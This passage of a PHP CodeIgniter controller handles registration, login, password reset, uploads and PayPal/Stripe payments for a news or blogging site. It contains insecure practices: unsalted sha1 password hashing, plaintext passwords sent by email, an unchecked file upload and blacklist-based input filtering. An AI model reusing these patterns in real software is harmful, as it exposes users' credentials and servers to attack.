        $this->load->library('Ajax_pagination');

        $id = $this->session->userdata('user_id');
        $this->db->where('from_where', '{"type":"user","id":"' . $id . '"}');
        $this->db->or_where('to_where', '{"type":"user","id":"' . $id . '"}');
        $config['total_rows'] = $this->db->count_all_results('ticket');
        $config['base_url'] = base_url() . 'home/ticket_listed/';
        $config['per_page'] = 5;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para2;

        $function = "ticket_listed('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "ticket_listed('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "ticket_listed('" . ($para2 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "ticket_listed('" . ($para2 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination pagination-style-2 pagination-sm">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a rel="grow" class="btn-u btn-u-red grow" class="active">';
        $config['cur_tag_close'] = '</a></li>';

        $function = "ticket_listed(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);
        $this->db->where('from_where', '{"type":"user","id":"' . $id . '"}');
        $this->db->or_where('to_where', '{"type":"user","id":"' . $id . '"}');
        $page_data['query'] = $this->db->get('ticket', $config['per_page'], $para2)->result_array();
        $this->load->view('front/user/profile/ticket_listed', $page_data);
    }

    function readlater_listed($para2 = '') {
        $this->load->library('Ajax_pagination');

        $id = $this->session->userdata('user_id');
        $ids = json_decode($this->db->get_where('user', array('user_id' => $id))->row()->readlater, true);
        $this->db->where('status', 'published');
        $this->db->where_in('news_id', $ids);

        $config['total_rows'] = $this->db->count_all_results('news');
        $config['base_url'] = base_url() . 'home/readlater_listed/';
        $config['per_page'] = 5;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para2;

        $function = "readlater_listed('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "readlater_listed('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "readlater_listed('" . ($para2 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "readlater_listed('" . ($para2 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination pagination-style-2 ">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a rel="grow" class="btn-u btn-u-red grow" class="active">';
        $config['cur_tag_close'] = '</a></li>';

        $function = "readlater_listed(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a rel="grow" class="btn-u btn-u-sea grow" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);
        $ids = json_decode($this->db->get_where('user', array('user_id' => $id))->row()->readlater, true);
        $this->db->where('status', 'published');
        $this->db->where_in('news_id', $ids);
        $page_data['query'] = $this->db->get('news', $config['per_page'], $para2)->result_array();
        $this->load->view('front/user/profile/read_later_listed', $page_data);
    }

    /* FUNCTION: Concerning wishlist */

    function readlater($para1 = "", $para2 = "") {
        if ($para1 == 'add') {
            $result = $this->Crud_model->add_readlater($para2);
            echo $result;
        } else if ($para1 == 'remove') {
            $this->Crud_model->remove_readlater($para2);
        } else if ($para1 == 'num') {
            echo $this->Crud_model->readlater_num();
        }
    }

    /* FUNCTION: Newsletter Subscription */

    function subscribe() {
        $safe = 'yes';
        $char = '';
        foreach ($_POST as $row) {
            if (preg_match('/[\'^":()}{#~><>|=+¬]/', $row, $match)) {
                $safe = 'no';
                $char = $match[0];
            }
        }

        $this->load->library('form_validation');
        $this->form_validation->set_rules('email', 'Email', 'required');
        if ($this->form_validation->run() == FALSE) {
            echo validation_errors();
        } else {
            if ($safe == 'yes') {
                $subscribe_num = $this->session->userdata('subscriber');
                $email = $this->input->post('email');
                $subscriber = $this->db->get('subscribe')->result_array();
                $exists = 'no';
                foreach ($subscriber as $row) {
                    if ($row['email'] == $email) {
                        $exists = 'yes';
                    }
                }
                if ($exists == 'yes') {
                    echo 'already';
                } else if ($subscribe_num >= 3) {
                    echo 'already_session';
                } else if ($exists == 'no') {
                    $subscribe_num = $subscribe_num + 1;
                    $this->session->set_userdata('subscriber', $subscribe_num);
                    $data['email'] = $email;
                    $this->db->insert('subscribe', $data);
                    echo 'done';
                }
            } else {
                echo 'Disallowed charecter : " ' . $char . ' " in the POST';
            }
        }
    }

    function be_blogger($para1 = "") {
        if ($para1 == "") {
            $this->load->view('front/user/profile/be_blogger_modal');
        } else if ($para1 == "make_blogger") {
            $id = $this->session->userdata('user_id');
            $data['is_blogger'] = 'yes';
            $this->db->where('user_id', $id);
            $this->db->update('user', $data);

            redirect(base_url() . 'home/profile', 'refresh');
        }

    }

    function purchased_packages($para1) {
        $page_data['payment_id'] = $para1;
        $this->load->view('front/user/profile/purchased_packages_modal', $page_data);
    }

    /* FUNCTION: Customer Registration */

    function registration($para1 = "", $para2 = "") {
        $safe = 'yes';
        $char = '';
        foreach ($_POST as $k => $row) {
            if (preg_match('/[\'^":()}{#~><>|=¬]/', $row, $match)) {
                if ($k !== 'password1' && $k !== 'password2') {
                    $safe = 'no';
                    $char = $match[0];
                }
            }
        }
        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
            $this->load->library('recaptcha');
        }
        $this->load->library('form_validation');
        if ($para1 == "add_info") {
            $msg = '';
            $this->form_validation->set_rules('firstname', 'Your First Name', 'required');
            $this->form_validation->set_rules('lastname', 'Your Last Name', 'required');
            $this->form_validation->set_rules('email', 'Email', 'required|is_unique[user.email]|valid_email', array('required' => 'You have not provided %s.', 'is_unique' => 'This %s already exists.'));
            $this->form_validation->set_rules('password1', 'Password', 'required|matches[password2]');
            $this->form_validation->set_rules('password2', 'Confirm Password', 'required');
            $this->form_validation->set_rules('address1', 'Address Line 1', 'required');
            $this->form_validation->set_rules('address2', 'Address Line 2', 'required');
            $this->form_validation->set_rules('phone', 'Phone', 'required');
            $this->form_validation->set_rules('zip', 'ZIP', 'required');
            $this->form_validation->set_rules('city', 'City', 'required');
            $this->form_validation->set_rules('state', 'State', 'required');
            $this->form_validation->set_rules('country', 'Country', 'required');
            $this->form_validation->set_rules('terms_check', 'Terms & Condition check', 'required', array('required' => translate('you_must_agree_with_terms_&_conditions')));

            if ($this->form_validation->run() == FALSE) {
                echo validation_errors();
            } else {
                if ($safe == 'yes') {
                    if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                        $captcha_answer = $this->input->post('g-recaptcha-response');
                        $response = $this->recaptcha->verifyResponse($captcha_answer);
                        if ($response['success']) {
                            $data['firstname'] = $this->input->post('firstname', true);
                            $data['lastname'] = $this->input->post('lastname', true);
                            $data['email'] = $this->input->post('email');
                            $data['address1'] = $this->input->post('address1');
                            $data['address2'] = $this->input->post('address2');
                            $data['phone'] = $this->input->post('phone');
                            $data['zip'] = $this->input->post('zip');
                            $data['state'] = $this->input->post('state');
                            $data['country'] = $this->input->post('country');
                            $data['city'] = $this->input->post('city');
                            if (!empty($this->input->post('is_blogger'))) {
                                $data['is_blogger'] = $this->input->post('is_blogger');
                            } else {
                                $data['is_blogger'] = "no";
                            }
                            $data['langlat'] = '';
                            $data['readlater'] = '[]';
                            $data['creation_date'] = time();
                            $package_info = $this->db->get_where('subscription',array('subscription_id'=>1))->row();
                            $data['post_amount'] = $package_info->post_amount;
                            $data['video_amount'] = $package_info->video_amount;
                            $data['photo_amount'] = $package_info->photo_amount;


                            if ($this->input->post('password1') == $this->input->post('password2')) {
                                $password = $this->input->post('password1');
                                $data['password'] = sha1($password);
                                $this->db->insert('user', $data);
                                $msg = 'done';
                                if ($this->Email_model->account_opening('user', $data['email'], $password) == false) {
                                    $msg = 'done_but_not_sent';
                                } else {
                                    $msg = 'done_and_sent';
                                }
                            }
                            echo $msg;
                        } else {
                            echo translate('please_fill_the_captcha');
                        }
                    } else {
                        $data['firstname'] = $this->input->post('firstname');
                        $data['lastname'] = $this->input->post('lastname');
                        $data['email'] = $this->input->post('email');
                        $data['address1'] = $this->input->post('address1');
                        $data['address2'] = $this->input->post('address2');
                        $data['phone'] = $this->input->post('phone');
                        $data['zip'] = $this->input->post('zip');
                        $data['state'] = $this->input->post('state');
                        $data['country'] = $this->input->post('country');
                        $data['city'] = $this->input->post('city');
                        if (!empty($this->input->post('is_blogger'))) {
                            $data['is_blogger'] = $this->input->post('is_blogger');
                        } else {
                            $data['is_blogger'] = "no";
                        }
                        $data['langlat'] = '';
                        $data['readlater'] = '[]';
                        $data['creation_date'] = time();
                        $package_info = $this->db->get_where('subscription',array('subscription_id'=>1))->row();
                        $data['post_amount'] = $package_info->post_amount;
                        $data['video_amount'] = $package_info->video_amount;
                        $data['photo_amount'] = $package_info->photo_amount;

                        if ($this->input->post('password1') == $this->input->post('password2')) {
                            $password = $this->input->post('password1');
                            $data['password'] = sha1($password);
                            $this->db->insert('user', $data);
                            $msg = 'done';
                            if (@$this->Email_model->account_opening('user', $data['email'], $password) == false) {
                                $msg = 'done_but_not_sent';
                            } else {
                                $msg = 'done_and_sent';
                            }
                        }
                        echo $msg;
                    }
                } else {
                    echo 'Disallowed charecter : " ' . $char . ' " in the POST';
                }
            }
        } else if ($para1 == "update_info") {
            $id = $this->session->userdata('user_id');
            $data['firstname'] = $this->input->post('firstname');
            $data['lastname'] = $this->input->post('lastname');
            $data['address1'] = $this->input->post('address1');
            $data['address2'] = $this->input->post('address2');
            $data['phone'] = $this->input->post('phone');
            $data['city'] = $this->input->post('city');
            $data['skype'] = $this->input->post('skype');
            $data['google'] = $this->input->post('google');
            $data['facebook'] = $this->input->post('facebook');
            $data['zip'] = $this->input->post('zip');
            $data['state'] = $this->input->post('state');
            $data['country'] = $this->input->post('country');

            $this->db->where('user_id', $id);
            $this->db->update('user', $data);
            echo "done";
        } else if ($para1 == "update_password") {
            if(!demo()){
                $user_data['password'] = $this->input->post('password');
                $account_data = $this->db->get_where('user', array(
                            'user_id' => $this->session->userdata('user_id')
                        ))->result_array();
                foreach ($account_data as $row) {
                    if (sha1($user_data['password']) == $row['password']) {
                        if ($this->input->post('password1') == $this->input->post('password2')) {
                            $data['password'] = sha1($this->input->post('password1'));
                            $this->db->where('user_id', $this->session->userdata('user_id'));
                            $this->db->update('user', $data);
                            echo "done";
                        } else {
                            echo translate('passwords_did_not_match!');
                        }
                    } else {
                        echo translate('wrong_old_password!');
                    }
                }
            }
        } else if ($para1 == "change_picture") {
            if(!demo()){
                $id = $this->session->userdata('user_id');
                $this->Crud_model->file_up('img', 'user', $id, '', '', '', 'jpg');
            }
            echo 'done';
        } else {
            $this->load->view('front/registration', $page_data);
        }
    }

    function change_blogger_cover($user_id){
        if(!demo()){
            move_uploaded_file($_FILES['cvr_img']['tmp_name'], 'uploads/blogger_cover_image/cover_image_' . $user_id .'.jpg');
        }
        echo 'done';
    }

    // For advertisement section
    function get_banner_section($para1=''){
        $page_data['ad_element'] = $this->db->get_where('advertisement',array('page_id' => $para1,'status'=>'ok'))->result_array();
        $this->load->view('front/components/advertise/box',$page_data);
    }

    function marketing($para1='',$para2='',$para3=''){
        if ($this->session->userdata('user_login') !== "yes") {
            redirect(base_url() . 'home', 'refresh');
        }
        if($para1 == 'page'){
            $page_data['ad_element'] = $this->db->get_where('advertisement',array('page_id' => $para2,'status'=>'ok'))->result_array();
            $this->load->view('front/advertise/box',$page_data);
        }
        else if($para1 == 'preview'){
            $page_data['ad_info'] = $this->db->get_where('advertisement',array('advertisement_id' => $para2))->row();
            $this->load->view('front/advertise/advertise_information_modal',$page_data);
        }
        else if($para1 == 'preview_package'){
            $page_data['ad_info'] = $this->db->get_where('advertisement',array('advertisement_id' => $para2))->row();
            $this->load->view('front/advertise/advertise_package_modal',$page_data);
        }
        else if($para1 == 'apply'){
            $page_data['page_name'] = 'advertise/apply';
            $page_data['ad_id']     = $para2;
            $page_data['package_id']   = $para3;
            $page_data['asset_page'] = "advertise";
            $page_data['page_title'] = translate('apply_for_advertise');
            $this->load->view('front/index',$page_data);
        }
        else if($para1 == 'package'){
            $page_data['ad_info']   = $this->db->get_where('advertisement',array('advertisement_id' => $para2))->row();
            $page_data['package_id']   = $para3;
            $this->load->view('front/advertise/apply/package',$page_data);
        }
        else if($para1 == 'payment_options'){
            $page_data['p_set'] = $this->Crud_model->get_settings_value('business_settings','paypal_set','value');
            $page_data['s_set'] = $this->Crud_model->get_settings_value('business_settings','stripe_set','value');
            $page_data['system_name'] = $this->Crud_model->get_settings_value('general_settings','system_name','value');
            $this->load->view('front/advertise/apply/payment_options',$page_data);
        }
        else if($para1 == 'payment'){
            $user_id            = $this->session->userdata('user_id');
            $advertisement_id   = $this->input->post('advertisement_id');
            $package_id         = $this->input->post('package');
            $packages           = $this->db->get_where('advertisement', array('advertisement_id' => $advertisement_id))->row()->package;
            $packages           = json_decode($packages,true);
            foreach($packages as $package){
                if($package['index'] == $package_id){
                    $amount     = $package['price'];
                }
            }
            if ($this->input->post('payment_type') == 'paypal') {
                $data['user_id']            = $user_id;
                $data['advertisement_id']   = $advertisement_id;
                $data['package_id']         = $package_id;
                $data['payment_type']       = 'Paypal';
                $data['payment_status']     = 'due';
                $data['payment_details']    = 'none';
                $data['amount']             = $amount;
                $data['purchase_datetime']  = time();

                $paypal_email               = $this->Crud_model->get_settings_value('business_settings', 'paypal_email', 'value');

                $this->db->insert('advertisement_payment', $data);
                $payment_id           = $this->db->insert_id();

                $data['payment_code'] = date('Ym', $data['purchase_datetime']) . $payment_id;

                $this->db->where('advertisement_payment_id', $payment_id);
                $this->db->update('advertisement_payment', $data);

                $this->session->set_userdata('payment_id', $payment_id);

                /****TRANSFERRING USER TO PAYPAL TERMINAL****/
                $this->paypal->add_field('rm', 2);
                $this->paypal->add_field('cmd', '_xclick');
                $this->paypal->add_field('business', $paypal_email);
                $this->paypal->add_field('item_name', 'Subscription Payment');
                $this->paypal->add_field('amount', number_format((float)$amount, 2, '.', ''));
                $this->paypal->add_field('currency_code', 'USD');
                $this->paypal->add_field('custom', $payment_id);

                $this->paypal->add_field('notify_url', base_url() . 'home/paypal_ipn');
                $this->paypal->add_field('cancel_return', base_url() . 'home/paypal_cancel');
                $this->paypal->add_field('return', base_url() . 'home/paypal_success');

                // submit the fields to paypal
                $this->paypal->submit_paypal_post();
            }
            else if($this->input->post('payment_type') == 'stripe'){
                if($this->input->post('stripeToken')) {

                    $stripe_api_key = $this->db->get_where('business_settings' , array('type' => 'stripe_secret_key'))->row()->value;
                    require_once(APPPATH . 'libraries/stripe-php/init.php');
                    \Stripe\Stripe::setApiKey($stripe_api_key); //system payment settings
                    $user_email = $this->db->get_where('user' , array('user_id' => $user_id))->row()->email;

                    $user = \Stripe\Customer::create(array(
                        'email' => $user_email, // customer email id
                        'card'  => $_POST['stripeToken']
                    ));

                    $charge = \Stripe\Charge::create(array(
                        'customer'  => $user->id,
                        'amount'    => ceil($amount*100),
                        'currency'  => 'USD'
                    ));
                    if($charge->paid == true){
                        $user = (array) $user;
                        $charge = (array) $charge;

                        $data['user_id']            = $user_id;
                        $data['advertisement_id']   = $advertisement_id;
                        $data['package_id']         = $package_id;
                        $data['payment_type']       = 'Stripe';
                        $data['payment_status']     = 'paid';
                        $data['payment_details']    = "User Info: \n".json_encode($user,true)."\n \n Charge Info: \n".json_encode($charge,true);
                        $data['amount']             = $amount;
                        $data['purchase_datetime']  = time();
                        $data['expire']             = 'no';
                        switch ($package_id) {
                            case '1':
                                $data['expire_timestamp'] = time()+604800;
                                break;
                            case '2':
                                $data['expire_timestamp'] = time()+2592000;
                                break;
                            case '3':
                                $data['expire_timestamp'] = time()+15552000;
                                break;
                            case '4':
                                $data['expire_timestamp'] = time()+31536000;
                                break;

                            default:
                                $data2['expire_timestamp'] = time();
                                break;
                        }
                        $this->db->insert('advertisement_payment', $data);
                        $payment_id           = $this->db->insert_id();
                        $data1['payment_code'] = date('Ym', $data['purchase_datetime']) . $payment_id;
                        $data1['payment_timestamp'] = time();
                        $this->db->where('advertisement_payment_id', $payment_id);
                        $this->db->update('advertisement_payment', $data1);

                        $data2['user_id']          = $user_id;
                        $data2['availability']     = 'booked';
                        $data2['approval']         = 'ok';
                        $this->db->where('advertisement_id',$advertisement_id);
                        $this->db->update('advertisement',$data2);
                        $this->Email_model->purchase_packages_for_advertisement($payment_id);
                        redirect(base_url() . 'home/profile/ad', 'refresh');

                    } else{
                        $this->session->set_flashdata('alert', 'unsuccessful_stripe');
                        redirect(base_url() . 'home/marketing', 'refresh');
                    }
                }
            }
        }
        else{
            $page_data['page_name'] = "advertise";
            $page_data['asset_page'] = "advertise";
            $page_data['page_title'] = translate('apply_for_advertise');
            $page_data['pages'] = $this->db->get('ad_page')->result_array();
            $this->load->view('front/index', $page_data);
        }
    }
    /* FUNCTION: Verify paypal payment by IPN*/
    function paypal_ipn()
    {
        if ($this->paypal->validate_ipn() == true) {

            $payment_id                = $_POST['custom'];
            $payment = $this->db->get_where('advertisement_payment',array('advertisement_payment_id' => $payment_id))->row();

            $data['payment_details']   = json_encode($_POST);
            $data['payment_timestamp'] = time();
            $data['payment_type']      = 'Paypal';
            $data['payment_status']    = 'paid';
            $data['expire']            = 'no';
            switch ($payment->package_id) {
                case '1':
                    $data['expire_timestamp'] = $data['payment_timestamp']+604800;
                    break;
                case '2':
                    $data['expire_timestamp'] = $data['payment_timestamp']+2592000;
                    break;
                case '3':
                    $data['expire_timestamp'] = $data['payment_timestamp']+15552000;
                    break;
                case '4':
                    $data['expire_timestamp'] = $data['payment_timestamp']+31536000;
                    break;

                default:
                    $data2['expire_timestamp'] = time();
                    break;
            }
            $this->db->where('advertisement_payment_id', $payment_id);
            $this->db->update('advertisement_payment', $data);

            $data1['user_id']          = $payment->user_id;
            $data1['availability']     = 'booked';
            $data1['approval']         = 'ok';

            $this->db->where('advertisement_id', $payment->advertisement_id);
            $this->db->update('advertisement',$data1);
            $this->Email_model->purchase_packages_for_advertisement($payment_id);
        }
    }

    /* FUNCTION: Loads after cancelling paypal*/
    function paypal_cancel()
    {
        $payment_id = $this->session->userdata('payment_id');
        $this->db->where('advertisement_payment_id', $payment_id);
        $this->db->delete('advertisement_payment');
        $this->session->set_userdata('payment_id', '');
        $this->session->set_flashdata('alert', 'payment_cancel');
        redirect(base_url() . 'home/marketing', 'refresh');
    }

    /* FUNCTION: Loads after successful paypal payment*/
    function paypal_success()
    {
        $this->session->set_userdata('payment_id', '');
        redirect(base_url() . 'home/profile/ad', 'refresh');
    }
    function faq() {
        $page_data['page_name'] = "others/faq";
        $page_data['asset_page'] = "faq";
        $page_data['page_title'] = translate('frequently_asked_questions');
        $page_data['faqs'] = json_decode($this->Crud_model->get_settings_value('general_settings', 'faqs', 'value'), true);
        $this->load->view('front/index', $page_data);
    }

    //process payment
    function process_payment()
    {
        if ($this->session->userdata('user_login') !== "yes") {
            redirect(base_url() . 'home', 'refresh');
        }
        if(demo()){
            redirect(base_url() . 'home/profile', 'refresh');
        }
        if ($this->input->post('payment_type') == 'paypal') {
            $user_id = $this->session->userdata('user_id');
            $payment_type = $this->input->post('payment_type');
            $subscription_id = $this->input->post('package');
            $amount = $this->db->get_where('subscription', array('subscription_id' => $subscription_id))->row()->amount;
            $package_name = $this->db->get_where('subscription', array('subscription_id' => $subscription_id))->row()->name;

            $data['subscription_id']    = $subscription_id;
            $data['user_id']            = $user_id;
            $data['payment_type']       = 'Paypal';
            $data['payment_status']     = 'due';
            $data['payment_details']    = 'none';
            $data['amount']             = $amount;
            $data['purchase_datetime']  = time();

            $paypal_email = $this->Crud_model->get_settings_value('business_settings', 'paypal_email', 'value');

            $this->db->insert('subscription_payment', $data);
            $subscription_payment_id = $this->db->insert_id();

            $data['payment_code'] = date('Ym', $data['purchase_datetime']) . $subscription_payment_id;

            $this->session->set_userdata('subscription_payment_id', $subscription_payment_id);

            /****TRANSFERRING USER TO PAYPAL TERMINAL****/
            $this->paypal->add_field('rm', 2);
            $this->paypal->add_field('cmd', '_xclick');
            $this->paypal->add_field('business', $paypal_email);
            $this->paypal->add_field('item_name', $package_name);
            $this->paypal->add_field('amount', $amount);
            $this->paypal->add_field('currency_code', 'USD');
            $this->paypal->add_field('custom', $subscription_payment_id);

            $this->paypal->add_field('notify_url', base_url().'home/subscription_paypal_ipn');
            $this->paypal->add_field('cancel_return', base_url().'home/subscription_paypal_cancel');
            $this->paypal->add_field('return', base_url().'home/subscription_paypal_success');

            // submit the fields to paypal
            $this->paypal->submit_paypal_post();
        }
        else if($this->input->post('payment_type') == 'stripe'){
            if($this->input->post('stripeToken')) {
                $user_id = $this->session->userdata('user_id');
                $payment_type = $this->input->post('payment_type');
                $subscription_id = $this->input->post('package');
                $amount = $this->db->get_where('subscription', array('subscription_id' => $subscription_id))->row()->amount;
                $stripe_api_key = $this->db->get_where('business_settings' , array('type' => 'stripe_secret_key'))->row()->value;
                require_once(APPPATH.'libraries/stripe-php/init.php');
                \Stripe\Stripe::setApiKey($stripe_api_key); //system payment settings
                $user_email = $this->db->get_where('user' , array('user_id' => $user_id))->row()->email;

                $user = \Stripe\Customer::create(array(
                    'email' => $user_email, // user email id
                    'card'  => $_POST['stripeToken']
                ));

                $charge = \Stripe\Charge::create(array(
                    'customer'  => $user->id,
                    'amount'    => ceil($amount*100),
                    'currency'  => 'USD'
                ));
                if($charge->paid == true){
                    $user = (array) $user;
                    $charge = (array) $charge;

                    $data['subscription_id']    = $subscription_id;
                    $data['user_id']            = $user_id;
                    $data['payment_type']       = 'Stripe';
                    $data['payment_status']     = 'paid';
                    $data['payment_details']    = "User Info: \n".json_encode($user,true)."\n \n Charge Info: \n".json_encode($charge,true);
                    $data['amount']             = $amount;
                    $data['purchase_datetime']  = time();

                    $this->db->insert('subscription_payment', $data);
                    $subscription_payment_id = $this->db->insert_id();

                    $data1['payment_code'] = date('Ym', $data['purchase_datetime']) . $subscription_payment_id;
                    $data1['payment_timestamp'] = time();

                    $this->db->where('subscription_payment_id', $subscription_payment_id);
                    $this->db->update('subscription_payment', $data1);

                    $payment = $this->db->get_where('subscription_payment',array('subscription_payment_id' => $subscription_payment_id))->row();
                    $prev_post_amount =  $this->db->get_where('user', array('user_id' => $payment->user_id))->row()->post_amount;
                    $prev_video_amount = $this->db->get_where('user', array('user_id' => $payment->user_id))->row()->video_amount;
                    $prev_photo_amount = $this->db->get_where('user', array('user_id' => $payment->user_id))->row()->photo_amount;

                    $data2['membership'] = 1;

                    $data2['post_amount'] = $prev_post_amount + $this->db->get_where('subscription', array('subscription_id' => $payment->subscription_id))->row()->post_amount;

                    $data2['video_amount'] = $prev_video_amount + $this->db->get_where('subscription', array('subscription_id' => $payment->subscription_id))->row()->video_amount;

                    $data2['photo_amount'] = $prev_photo_amount + $this->db->get_where('subscription', array('subscription_id' => $payment->subscription_id))->row()->photo_amount;

                    $this->db->where('user_id', $payment->user_id);
                    $this->db->update('user', $data2);

                    $this->session->set_flashdata('alert', 'stripe_success');
                    redirect(base_url() . 'home/profile', 'refresh');

                } else{
                    $this->session->set_flashdata('alert', 'stripe_failed');
                    redirect(base_url() . 'home/profile', 'refresh');
                }
            }
        }
    }

    function subscription_paypal_ipn() {
        if ($this->paypal->validate_ipn() == true) {
            $payment_id                = $_POST['custom'];
            $payment                   = $this->db->get_where('subscription_payment',array('subscription_payment_id' => $payment_id))->row();
            $data['payment_details']   = json_encode($_POST);
            $data['payment_timestamp'] = time();
            $data['payment_type']      = 'Paypal';
            $data['payment_status']    = 'paid';
            $this->db->where('subscription_payment_id', $payment_id);
            $this->db->update('subscription_payment', $data);

            $prev_post_amount =  $this->db->get_where('user', array('user_id' => $payment->user_id))->row()->post_amount;
            $prev_video_amount = $this->db->get_where('user', array('user_id' => $payment->user_id))->row()->video_amount;
            $prev_photo_amount = $this->db->get_where('user', array('user_id' => $payment->user_id))->row()->photo_amount;

            $data1['membership'] = 1;

            $data1['post_amount'] = $prev_post_amount + $this->db->get_where('subscription', array('subscription_id' => $payment->subscription_id))->row()->post_amount;

            $data1['video_amount'] = $prev_video_amount + $this->db->get_where('subscription', array('subscription_id' => $payment->subscription_id))->row()->video_amount;

            $data1['photo_amount'] = $prev_photo_amount + $this->db->get_where('subscription', array('subscription_id' => $payment->subscription_id))->row()->photo_amount;

            $this->db->where('user_id', $payment->user_id);
            $this->db->update('user', $data1);
        }
    }

    function subscription_paypal_cancel()
    {
        $subscription_payment_id = $this->session->userdata('subscription_payment_id');
        $this->db->where('subscription_payment_id', $subscription_payment_id);
        $this->db->delete('subscription_payment');
        $this->session->set_userdata('subscription_payment_id', '');
        $this->session->set_flashdata('alert', 'paypal_cancel');
        redirect(base_url() . 'home/profile', 'refresh');
    }

    /* FUNCTION: Loads after successful paypal payment*/
    function subscription_paypal_success()
    {
        $this->session->set_userdata('subscription_payment_id', '');
        redirect(base_url() . 'home/profile/pfp', 'refresh');
    }

    /* FUNCTION: Check if Customer is logged in */

    function check_login($para1 = "") {
        if ($para1 == 'state') {
            if ($this->session->userdata('user_login') == 'yes') {
                echo 'hypass';
            }
            if ($this->session->userdata('user_login') !== 'yes') {
                echo 'nypose';
            }
        } else if ($para1 == 'id') {
            echo $this->session->userdata('user_id');
        } else {
            echo $this->Crud_model->get_type_name_by_id('user', $this->session->userdata('user_id'), $para1);
        }
    }

    function login($para1 = "", $para2 = "") {
        $page_data['page_name'] = "login";
        $this->load->library('form_validation');
        if ($para1 == "do_login") {
            $this->form_validation->set_rules('email', 'Email', 'required');
            $this->form_validation->set_rules('password', 'Password', 'required');

            if ($this->form_validation->run() == FALSE) {
                echo validation_errors();
            } else {
                $signin_data = $this->db->get_where('user', array(
                    'email' => $this->input->post('email'),
                    'password' => sha1($this->input->post('password'))
                ));
                if ($signin_data->num_rows() > 0) {
                    foreach ($signin_data->result_array() as $row) {
                        $this->session->set_userdata('user_login', 'yes');
                        $this->session->set_userdata('user_id', $row['user_id']);
                        $this->session->set_userdata('name', $row['firstname'] . ' ' . $row['lastname']);
                        $this->session->set_flashdata('alert', 'successful_signin');
                        $this->db->where('user_id', $row['user_id']);
                        $this->db->update('user', array(
                            'last_login' => time()
                        ));
                        echo 'done';
                    }
                } else {
                    echo 'failed';
                }
            }
        } else if ($para1 == 'forget') {
            $this->load->library('form_validation');
            $this->form_validation->set_rules('email', 'Email', 'required');

            if ($this->form_validation->run() == FALSE) {
                echo validation_errors();
            } else {
                $query = $this->db->get_where('user', array(
                    'email' => $this->input->post('email')
                ));
                if ($query->num_rows() > 0) {
                    $user_id = $query->row()->user_id;
                    $password = substr(hash('sha512', rand()), 0, 12);
                    $data['password'] = sha1($password);
                    $this->db->where('user_id', $user_id);
                    $this->db->update('user', $data);
                    if ($this->Email_model->password_reset_email('user', $user_id, $password)) {
                        echo 'email_sent';
                    } else {
                        echo 'email_not_sent';
                    }
                } else {
                    echo 'email_nay';
                }
            }
        }
        //$this->load->view('front/index', $page_data);
    }

    /* FUNCTION: Setting login page with facebook and google */

    function login_set($para1 = '', $para2 = '', $para3 = '') {
        if ($this->session->userdata('user_login') == "yes") {
            redirect(base_url() . 'home/profile', 'refresh');
        }
        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
            $this->load->library('recaptcha');
        }
        $this->load->library('form_validation');

        $fb_login_set = $this->Crud_model->get_settings_value('third_party_settings', 'fb_login_set');
        $g_login_set = $this->Crud_model->get_settings_value('third_party_settings', 'g_login_set');
        $page_data = array();

        if ($fb_login_set == 'ok') {
            $appid        = $this->db->get_where('third_party_settings', array('type' => 'fb_appid'))->row()->value;
            $secret       = $this->db->get_where('third_party_settings', array('type' => 'fb_secret'))->row()->value;
            $config       = array('appId' => $appid,'secret' => $secret);
            $this->load->library('Facebook', $config);

            // Try to get the user's id on Facebook
            //$data['user'] = array();
            if ($this->facebook->is_authenticated())
            {
                $page_data['furl'] = $this->facebook->login_url();
            }
            else {
                $page_data['furl'] = $this->facebook->login_url();
            }
            if ($para1 == 'back') {
                if(1 == 0){

                }
                else {
                    $user = $this->facebook->request('get', '/me?fields=id,first_name,last_name,name,email');
                    //var_dump($user);
                    if (!isset($user['error']))
                    {
                        if ($user_id = $this->Crud_model->exists_in_table('user', 'fb_id', $user['id'])) {

